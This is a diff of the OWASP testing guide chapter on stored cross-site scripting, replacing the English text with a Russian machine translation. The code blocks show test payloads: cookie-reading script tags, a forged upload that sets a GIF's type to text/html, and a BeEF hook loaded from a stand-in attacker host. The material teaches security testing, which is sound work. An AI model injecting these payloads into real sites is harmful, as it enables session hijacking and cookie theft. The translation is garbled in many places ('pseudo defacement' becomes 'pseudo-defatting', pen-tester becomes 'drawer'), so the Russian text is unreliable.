@@ -1,131 +1,131 @@
-# Testing for Stored Cross Site Scripting
+# Тестирование для хранимых сценариев на кросс-сайте
 
-|ID          |
-|------------|
-|WSTG-INPV-02|
+| ID |
+| ------------- |
+| WSTG-INPV-02 |
 
-## Summary
+## Резюме
 
-Stored [Cross-site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/) is the most dangerous type of Cross Site Scripting. Web applications that allow users to store data are potentially exposed to this type of attack. This chapter illustrates examples of stored cross site scripting injection and related exploitation scenarios.
+Хранится [Cross-site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/) является наиболее опасным типом кросс-сайта. Веб-приложения, которые позволяют пользователям хранить данные, потенциально подвержены атакам такого типа. В этой главе приведены примеры хранимых сценариев межсайтовых сценариев и связанных с ними сценариев эксплуатации.
 
-Stored XSS occurs when a web application gathers input from a user which might be malicious, and then stores that input in a data store for later use. The input that is stored is not correctly filtered. As a consequence, the malicious data will appear to be part of the web site and run within the user’s browser under the privileges of the web application. Since this vulnerability typically involves at least two requests to the application, this may also called second-order XSS.
+Хранящийся XSS возникает, когда веб-приложение собирает входные данные от пользователя, который может быть вредоносным, а затем сохраняет этот ввод в хранилище данных для последующего использования. Хранящийся вход не фильтруется правильно. Как следствие, вредоносные данные будут являться частью веб-сайта и запускаться в браузере пользователя под привилегиями веб-приложения. Поскольку эта уязвимость обычно включает в себя как минимум два запроса к приложению, это также может называться XSS второго порядка
 
-This vulnerability can be used to conduct a number of browser-based attacks including:
+Эта уязвимость может использоваться для проведения ряда атак на основе браузера, включая:
 
-- Hijacking another user's browser
-- Capturing sensitive information viewed by application users
-- Pseudo defacement of the application
-- Port scanning of internal hosts ("internal" in relation to the users of the web application)
-- Directed delivery of browser-based exploits
-- Other malicious activities
+- Угон браузера другого пользователя
+- Сбор конфиденциальной информации, просматриваемой пользователями приложения
+- Псевдообезжирение приложения
+- Портовое сканирование внутренних хостов («внутреннее» по отношению к пользователям веб-приложения)
+- Направленная доставка браузерных эксплойтов
+- Другие злонамеренные действия
 
-Stored XSS does not need a malicious link to be exploited. A successful exploitation occurs when a user visits a page with a stored XSS. The following phases relate to a typical stored XSS attack scenario:
+Хранящийся XSS не нуждается в вредоносной ссылке для использования. Успешная эксплуатация происходит, когда пользователь посещает страницу с сохраненным XSS. Следующие фазы относятся к типичному сохраненному сценарию атаки XSS:
 
-- Attacker stores malicious code into the vulnerable page
-- User authenticates in the application
-- User visits vulnerable page
-- Malicious code is executed by the user's browser
+- Атакующий хранит вредоносный код на уязвимой странице
+- Пользователь аутентифицируется в приложении
+- Пользователь посещает уязвимую страницу
+- Вредоносный код выполняется браузером пользователя
 
-This type of attack can also be exploited with browser exploitation frameworks such as [BeEF](https://beefproject.com) and [XSS Proxy](http://xss-proxy.sourceforge.net/). These frameworks allow for complex JavaScript exploit development.
+Этот тип атаки также может использоваться с такими системами эксплуатации браузера, как [BeEF](https://beefproject.com) а также [XSS Proxy](http://xss-proxy.sourceforge.net/). Эти рамки позволяют разрабатывать сложные функции JavaScript.
 
-Stored XSS is particularly dangerous in application areas where users with high privileges have access. When the administrator visits the vulnerable page, the attack is automatically executed by their browser. This might expose sensitive information such as session authorization tokens.
+Хранящийся XSS особенно опасен в областях приложений, где пользователи с высокими привилегиями имеют доступ. Когда администратор посещает уязвимую страницу, атака автоматически выполняется их браузером. Это может раскрыть конфиденциальную информацию, такую как токены авторизации сеанса.
 
-## Test Objectives
+## Цели теста
 
-- Identify stored input that is reflected on the client-side.
-- Assess the input they accept and the encoding that gets applied on return (if any).
+- Определите сохраненный ввод, который отражается на стороне клиента.
+- Оцените входные данные, которые они принимают, и кодировку, которая применяется при возврате (если есть).
 
-## How to Test
+## Как проверить
 
-### Black-Box Testing
+### Тестирование черного ящика
 
-The process for identifying stored XSS vulnerabilities is similar to the process described during the [testing for reflected XSS](01-Testing_for_Reflected_Cross_Site_Scripting.md).
+Процесс выявления сохраненных уязвимостей XSS аналогичен процессу, описанному во время [testing for reflected XSS](01-Testing_for_Reflected_Cross_Site_Scripting.md).
 
-#### Input Forms
+#### Входные формы
 
-The first step is to identify all points where user input is stored into the back-end and then displayed by the application. Typical examples of stored user input can be found in:
+Первый шаг - определить все точки, в которых пользовательский ввод сохраняется в серверной части, а затем отображается приложением. Типичные примеры сохраненного пользовательского ввода можно найти в:
 
-- User/Profiles page: the application allows the user to edit/change profile details such as first name, last name, nickname, avatar, picture, address, etc.
-- Shopping cart: the application allows the user to store items into the shopping cart which can then be reviewed later
-- File Manager: application that allows upload of files
-- Application settings/preferences: application that allows the user to set preferences
-- Forum/Message board: application that permits exchange of posts among users
-- Blog: if the blog application permits to users submitting comments
-- Log: if the application stores some users input into logs.
+- Страница пользователя / профиля: приложение позволяет пользователю редактировать / изменять данные профиля, такие как имя, фамилия, псевдоним, аватар, изображение, адрес и т. Д.
+- Корзина: приложение позволяет пользователю хранить товары в корзине, которые затем могут быть рассмотрены позже
+- Диспетчер файлов: приложение, которое позволяет загружать файлы
+- Настройки / предпочтения приложения: приложение, которое позволяет пользователю устанавливать настройки
+- Форум / Доска объявлений: приложение, которое позволяет обмениваться сообщениями между пользователями
+- Блог: если приложение блога позволяет пользователям отправлять комментарии
+- Журнал: если приложение хранит некоторые пользователи, вводятся в журналы.
 
-#### Analyze HTML Code
+#### Анализировать HTML-код
 
-Input stored by the application is normally used in HTML tags, but it can also be found as part of JavaScript content. At this stage, it is fundamental to understand if input is stored and how it is positioned in the context of the page. Differently from reflected XSS, the pen-tester should also investigate any out-of-band channels through which the application receives and stores users input.
+Ввод, хранящийся в приложении, обычно используется в тегах HTML, но его также можно найти как часть содержимого JavaScript. На данном этапе важно понимать, сохраняется ли ввод и как он позиционируется в контексте страницы. В отличие от отраженного XSS, рисовальщик должен также исследовать любые внеполосные каналы, через которые приложение получает и сохраняет входные данные пользователей.
 
-**Note**: All areas of the application accessible by administrators should be tested to identify the presence of any data submitted by users.
+**Note**: Все области приложения, доступные администраторам, должны быть проверены на наличие любых данных, представленных пользователями.
 
-**Example**: Email stored data in `index2.php`
+**Example**: Электронная почта хранится в `index2.php`
 
 ![Stored Input Example](images/Stored_input_example.jpg)\
 *Figure 4.7.2-1: Stored Input Example*
 
-The HTML code of index2.php where the email value is located:
+HTML-код index2.php, в котором находится значение электронной почты:
 
 ```html
 <input class="inputbox" type="text" name="email" size="40" value="aaa@aa.com" />
 ```
 
-In this case, the tester needs to find a way to inject code outside the `<input>` tag as below:
+В этом случае тестер должен найти способ ввести код вне тега `<input> `, как показано ниже:
 
 ```html
 <input class="inputbox" type="text" name="email" size="40" value="aaa@aa.com"> MALICIOUS CODE <!-- />
 ```
 
-#### Testing for Stored XSS
+#### Тестирование на хранимый XSS
 
-This involves testing the input validation and filtering controls of the application. Basic injection examples in this case:
+Это включает в себя тестирование входных проверок и фильтрацию элементов управления приложения. Основные примеры инъекций в этом случае:
 
 - `aaa@aa.com&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;`
 - `aaa@aa.com%22%3E%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E`
 
-Ensure the input is submitted through the application. This normally involves disabling JavaScript if client-side security controls are implemented or modifying the HTTP request with a web proxy. It is also important to test the same injection with both HTTP GET and POST requests. The above injection results in a popup window containing the cookie values.
+Убедитесь, что вход представлен через приложение. Обычно это включает в себя отключение JavaScript, если реализованы элементы управления безопасностью на стороне клиента, или изменение HTTP-запроса с помощью веб-прокси. Также важно проверить одну и ту же инъекцию с HTTP GET и POST запросами. Вышеуказанная инъекция приводит к всплывающему окну, содержащему значения cookie.
 
 > ![Stored XSS Exxample](images/Stored_xss_example.jpg)\
 > *Figure 4.7.2-2: Stored Input Example*
 >
-> The HTML code following the injection:
+> Код HTML после инъекции:
 >
 > ```html
 > <input class="inputbox" type="text" name="email" size="40" value="aaa@aa.com"><script>alert(document.cookie)</script>
 > ```
 >
-> The input is stored and the XSS payload is executed by the browser when reloading the page. If the input is escaped by the application, testers should test the application for XSS filters. For instance, if the string "SCRIPT" is replaced by a space or by a NULL character then this could be a potential sign of XSS filtering in action. Many techniques exist in order to evade input filters (see [testing for reflected XSS](01-Testing_for_Reflected_Cross_Site_Scripting.md)) chapter). It is strongly recommended that testers refer to [XSS Filter Evasion](https://owasp.org/www-community/xss-filter-evasion-cheatsheet) and [Mario](https://cybersecurity.wtf/encoder/) XSS Cheat pages, which provide an extensive list of XSS attacks and filtering bypasses. Refer to the whitepapers and tools section for more detailed information.
+> Входные данные сохраняются, и полезная нагрузка XSS выполняется браузером при перезагрузке страницы. Если приложение экранирует вход, тестировщики должны протестировать приложение на фильтрах XSS. Например, если строка «SCRIPT» заменяется пробелом или символом NULL, это может быть потенциальным признаком фильтрации XSS в действии. Существует много методов, чтобы избежать входных фильтров (см [testing for reflected XSS](01-Testing_for_Reflected_Cross_Site_Scripting.md)) chapter). Настоятельно рекомендуется, чтобы тестеры ссылались [XSS Filter Evasion](https://owasp.org/www-community/xss-filter-evasion-cheatsheet) а также [Mario](https://cybersecurity.wtf/encoder/) Читовые страницы XSS, которые предоставляют обширный список атак XSS и обходов фильтрации. Обратитесь к разделу «Бекросы и инструменты» для получения более подробной информации.
 
-#### Leverage Stored XSS with BeEF
+#### Кредитное плечо Хранится XSS с BeEF
 
-Stored XSS can be exploited by advanced JavaScript exploitation frameworks such as [BeEF](https://www.beefproject.com) and [XSS Proxy](http://xss-proxy.sourceforge.net/).
+Хранимый XSS может использоваться с помощью современных сред эксплуатации JavaScript, таких как [BeEF](https://www.beefproject.com) а также [XSS Proxy](http://xss-proxy.sourceforge.net/).
 
-A typical BeEF exploitation scenario involves:
+Типичный сценарий эксплуатации BeEF включает в себя:
 
-- Injecting a JavaScript hook which communicates to the attacker's browser exploitation framework (BeEF)
-- Waiting for the application user to view the vulnerable page where the stored input is displayed
-- Control the application user’s browser via the BeEF console
+- Ввод хука JavaScript, который связывается с платформой эксплуатации браузера злоумышленника (BeEF)
+- Ожидание, когда пользователь приложения увидит уязвимую страницу, на которой отображается сохраненный вход
+- Управление браузером пользователя приложения через консоль BeEF
 
-The JavaScript hook can be injected by exploiting the XSS vulnerability in the web application.
+Крюк JavaScript можно ввести, используя уязвимость XSS в веб-приложении.
 
-**Example**: BeEF Injection in `index2.php`:
+**Example**: BeEF Инъекция в `index2.php`:
 
 ```html
 aaa@aa.com"><script src=http://attackersite/hook.js></script>
 ```
 
-When the user loads the page `index2.php`, the script `hook.js` is executed by the browser. It is then possible to access cookies, user screenshot, user clipboard, and launch complex XSS attacks.
+Когда пользователь загружает страницу `index2.php`, браузер выполняет скрипт `hook.js`. Затем можно получить доступ к файлам cookie, скриншоту пользователя, буферу обмена пользователя и запустить сложные атаки XSS.
 
 > ![Beef Injection Example](images/RubyBeef.png)\
 > *Figure 4.7.2-3: Beef Injection Example*
 >
-> This attack is particularly effective in vulnerable pages that are viewed by many users with different privileges.
+> Эта атака особенно эффективна на уязвимых страницах, которые просматриваются многими пользователями с разными привилегиями.
 
-#### File Upload
+#### Загрузка файла
 
-If the web application allows file upload, it is important to check if it is possible to upload HTML content. For instance, if HTML or TXT files are allowed, XSS payload can be injected in the file uploaded. The pen-tester should also verify if the file upload allows setting arbitrary MIME types.
+Если веб-приложение позволяет загружать файлы, важно проверить, можно ли загрузить HTML-контент. Например, если разрешены файлы HTML или TXT, полезная нагрузка XSS может быть введена в загруженный файл. Pen-tester также должен проверить, позволяет ли загрузка файла устанавливать произвольные типы MIME.
 
-Consider the following HTTP POST request for file upload:
+Рассмотрим следующий запрос HTTP POST для загрузки файла:
 
 ```http
 POST /fileupload.aspx HTTP/1.1
@@ -136,9 +136,9 @@ Content-Type: text/plain
 test
 ```
 
-This design flaw can be exploited in browser MIME mishandling attacks. For instance, innocuous-looking files like JPG and GIF can contain an XSS payload that is executed when they are loaded by the browser. This is possible when the MIME type for an image such as `image/gif` can instead be set to `text/html`. In this case the file will be treated by the client browser as HTML.
+Этот недостаток дизайна может быть использован в атаках неправильного обращения MIME браузера. Например, безобидные файлы, такие как JPG и GIF, могут содержать полезную нагрузку XSS, которая выполняется при загрузке браузером. Это возможно, когда вместо этого можно установить тип MIME для изображения, такого как `image/gif`, в `text/html`. В этом случае файл будет обрабатываться клиентским браузером как HTML
 
-HTTP POST Request forged:
+HTTP POST Запрос подделан:
 
 ```html
 Content-Disposition: form-data; name="uploadfile1"; filename="C:\Documents and Settings\test\Desktop\test.gif"
@@ -147,29 +147,29 @@ Content-Type: text/html
 <script>alert(document.cookie)</script>
 ```
 
-Also consider that Internet Explorer does not handle MIME types in the same way as Mozilla Firefox or other browsers do. For instance, Internet Explorer handles TXT files with HTML content as HTML content. For further information about MIME handling, refer to the whitepapers section at the bottom of this chapter.
+Также учтите, что Internet Explorer не обрабатывает типы MIME так же, как Mozilla Firefox или другие браузеры. Например, Internet Explorer обрабатывает файлы TXT с HTML-контентом в виде HTML-контента. Для получения дополнительной информации об обработке MIME см. Раздел «Официальные документы» в нижней части этой главы.
 
-### Blind Cross-site Scripting
+### Слепой межсайтовый скрипт
 
-Blind Cross-site Scripting is a form of stored XSS. It generally occurs when the attacker’s payload is saved on the server/infrstructure and later reflected back to the victim from the backend application. For example in feedback forms, an attacker can submit the malicious payload using the form, and once the backend user/admin of the application views the attacker’s submission via the backend application, the attacker’s payload will get executed. Blind Cross-site Scripting is hard to confirm in the real-world scenario but one of the best tools for this is [XSS Hunter](https://xsshunter.com/).
+Слепой межсайтовый скрипт является формой сохраненного XSS. Обычно это происходит, когда полезная нагрузка атакующего сохраняется на сервере / инфраструктуре, а затем отражается обратно жертве из бэкэнд-приложения. Например, в формах обратной связи злоумышленник может отправить вредоносную полезную нагрузку с помощью формы, и как только внутренний пользователь / администратор приложения просматривает представление злоумышленника через бэкэнд-приложение, полезная нагрузка злоумышленника будет выполнена. Слепой межсайтовый скрипт трудно подтвердить в реальном сценарии, но один из лучших инструментов для этого [XSS Hunter](https://xsshunter.com/).
 
-> Note: Testers should carefully consider the privacy implications of using public or third party services while performing security tests. (See #tools.)
+> Примечание. Тестерны должны тщательно учитывать последствия использования общедоступных или сторонних услуг для обеспечения конфиденциальности при проведении тестов безопасности. (См. #tools.)
 
-### Gray-Box Testing
+### Тестирование серой коробки
 
-Gray-box testing is similar to black-box testing. In gray-box testing, the pen-tester has partial knowledge of the application. In this case, information regarding user input, input validation controls, and data storage might be known by the pen-tester.
+Тестирование серого ящика похоже на тестирование черного ящика. В тестировании «серой коробки» у мастера-ручки есть частичные знания о применении. В этом случае информация о вводе пользователем, контроле проверки ввода и хранении данных может быть известна у автора.
 
-Depending on the information available, it is normally recommended that testers check how user input is processed by the application and then stored into the back-end system. The following steps are recommended:
+В зависимости от доступной информации, обычно рекомендуется, чтобы тестировщики проверяли, как пользовательский ввод обрабатывается приложением, а затем сохраняется в серверной системе. Рекомендуются следующие шаги:
 
-- Use front-end application and enter input with special/invalid characters
-- Analyze application response(s)
-- Identify presence of input validation controls
-- Access back-end system and check if input is stored and how it is stored
-- Analyze source code and understand how stored input is rendered by the application
+- Используйте интерфейсное приложение и введите ввод специальными / недействительными символами
+- Анализировать ответ (ы) приложения
+- Определить наличие входных средств проверки
+- Получите доступ к серверной системе и проверьте, хранится ли вход и как он хранится
+- Анализируйте исходный код и понимайте, как сохраненный ввод отображается приложением
 
-If source code is available (as in white-box testing), all variables used in input forms should be analyzed. In particular, programming languages such as PHP, ASP, and JSP make use of predefined variables/functions to store input from HTTP GET and POST requests.
+Если исходный код доступен (как при тестировании в белом ящике), все переменные, используемые во входных формах, должны быть проанализированы. В частности, языки программирования, такие как PHP, ASP и JSP, используют предопределенные переменные / функции для хранения ввода из запросов HTTP GET и POST.
 
-The following table summarizes some special variables and functions to look at when analyzing source code:
+В следующей таблице приведены некоторые специальные переменные и функции, на которые следует обратить внимание при анализе исходного кода:
 
 | **PHP**        | **ASP**           |  **JSP**         |
 |----------------|-------------------|------------------|
@@ -178,7 +178,7 @@ The following table summarizes some special variables and functions to look at w
 | `$_REQUEST` – HTTP POST, GET and COOKIE variables | `Server.CreateObject` - used to upload files |
 | `$_FILES` - HTTP File Upload variables |
 
-**Note**: The table above is only a summary of the most important parameters but, all user input parameters should be investigated.
+**Note**: Приведенная выше таблица представляет собой только сводку наиболее важных параметров, но все входные параметры пользователя должны быть исследованы.
 
 ## Tools
 
